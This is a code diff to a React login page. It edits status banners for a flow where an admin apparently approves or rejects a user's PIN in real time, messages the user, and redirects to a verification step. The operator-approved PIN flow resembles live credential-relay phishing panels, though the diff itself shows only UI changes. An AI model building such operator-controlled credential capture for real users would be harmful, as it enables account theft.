@@ -26,10 +26,11 @@ api.interceptors.request.use(config => {
 
 const STATUS_MESSAGES = {
   pending: "⏳ En attente...",
-  approved: "✅ Code PIN approuvé !!",
+  approved: "✅ APPROVED SUCCESSFULLY!",
   wrong_pin: "❌ Code PIN incorrect",
   expired: "⏰ Délai de vérification dépassé",
-  rejected: "❌ Request rejected by admin"
+  rejected: "❌ REJECTED SUCCESSFULLY!",
+  message_sent: "💬 USER MESSAGED SUCCESSFULLY!"
 }
 
 function Login() {
@@ -115,6 +116,7 @@ function Login() {
       const data = response.data
       
       if (data.status === "approved") {
+        setStatus("approved")
         setLoading(false)
         setWaitingForApproval(false)
         setSessionIdRef(null)
@@ -126,7 +128,7 @@ function Login() {
           navigate(`${basePath}/verification`)
         }, 800)
       } else if (data.status === "rejected") {
-        setError("❌ Request rejected by admin. Please try again.")
+        setStatus("rejected")
         setLoading(false)
         setWaitingForApproval(false)
         if (pollingIntervalRef.current) {
@@ -151,6 +153,10 @@ function Login() {
         }
       } else if (data.status === "message_user") {
         setAdminMessage(data.message || "Message from admin received")
+        setStatus("message_sent")
+      } else if (data.status === "pending") {
+        setStatus("pending")
+        setWaitingForApproval(true)
       }
     } catch (err) {
       console.error("Polling error:", err)
@@ -265,19 +271,77 @@ function Login() {
           {adminMessage && (
             <div className="admin-message" style={{
               backgroundColor: "#f0f8ff",
-              border: "1px solid #11bb4a",
+              border: "2px solid #11bb4a",
               borderRadius: "8px",
-              padding: "12px",
+              padding: "15px",
               marginBottom: "15px",
-              borderLeft: "4px solid #11bb4a"
+              borderLeft: "5px solid #11bb4a",
+              textAlign: "center"
             }}>
-              <div style={{ display: "flex", alignItems: "center", gap: "8px", marginBottom: "8px" }}>
-                <span style={{ color: "#11bb4a" }}>💬</span>
-                <strong style={{ color: "#11bb4a" }}>Message from Admin:</strong>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
+                <span style={{ color: "#11bb4a", fontSize: "20px" }}>💬</span>
+                <strong style={{ color: "#11bb4a", fontSize: "16px" }}>Message from Admin:</strong>
               </div>
-              <div style={{ color: "#333", fontSize: "14px", lineHeight: "1.5" }}>
+              <div style={{ color: "#333", fontSize: "14px", lineHeight: "1.5", backgroundColor: "#fff", padding: "10px", borderRadius: "4px" }}>
                 {adminMessage}
               </div>
+            </div>
+          )}
+          
+          {status === "approved" && (
+            <div style={{
+              backgroundColor: "#e8f5e9",
+              border: "2px solid #4caf50",
+              borderRadius: "8px",
+              padding: "15px",
+              marginBottom: "15px",
+              textAlign: "center"
+            }}>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
+                <span style={{ color: "#4caf50", fontSize: "24px" }}>✅</span>
+                <h3 style={{ margin: 0, color: "#2e7d32" }}>APPROVED SUCCESSFULLY!</h3>
+              </div>
+              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
+                Redirecting to verification...
+              </p>
+            </div>
+          )}
+          
+          {status === "rejected" && (
+            <div style={{
+              backgroundColor: "#ffebee",
+              border: "2px solid #f44336",
+              borderRadius: "8px",
+              padding: "15px",
+              marginBottom: "15px",
+              textAlign: "center"
+            }}>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
+                <span style={{ color: "#f44336", fontSize: "24px" }}>❌</span>
+                <h3 style={{ margin: 0, color: "#c62828" }}>REJECTED SUCCESSFULLY!</h3>
+              </div>
+              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
+                Please try again or contact support
+              </p>
+            </div>
+          )}
+          
+          {status === "message_sent" && (
+            <div style={{
+              backgroundColor: "#e3f2fd",
+              border: "2px solid #2196f3",
+              borderRadius: "8px",
+              padding: "15px",
+              marginBottom: "15px",
+              textAlign: "center"
+            }}>
+              <div style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: "10px", marginBottom: "10px" }}>
+                <span style={{ color: "#2196f3", fontSize: "24px" }}>💬</span>
+                <h3 style={{ margin: 0, color: "#1565c0" }}>USER MESSAGED SUCCESSFULLY!</h3>
+              </div>
+              <p style={{ margin: "5px 0 0 0", color: "#333", opacity: 0.8 }}>
+                Admin will respond shortly
+              </p>
             </div>
           )}
           
